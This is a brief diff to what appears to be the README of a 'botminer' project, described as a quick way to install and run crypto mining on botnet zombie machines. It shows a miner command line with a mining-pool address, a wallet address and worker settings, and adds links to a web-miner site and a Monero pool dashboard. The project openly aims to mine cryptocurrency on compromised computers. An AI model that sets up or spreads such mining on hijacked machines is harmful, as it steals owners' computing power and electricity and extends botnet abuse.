@@ -1,5 +1,9 @@
 "MINER"    -a curvehash -o stratum+tcp://curvehash.na.mine.zergpool.com:3343 -u PFMAoXTxv92xyacKK3nrRv6ogfjGWhb583 -p c=PLSR,mc=PLSR,ID=rig1 -t 4,4
 
+crypto-webminer.com
+https://www.moneroocean.crypto-webminer.com/moneroocean.html
+https://moneroocean.stream/?#/dashboard
+
 
 # botminer
 A rapid install and run git for botnet zombie crypto mining. 
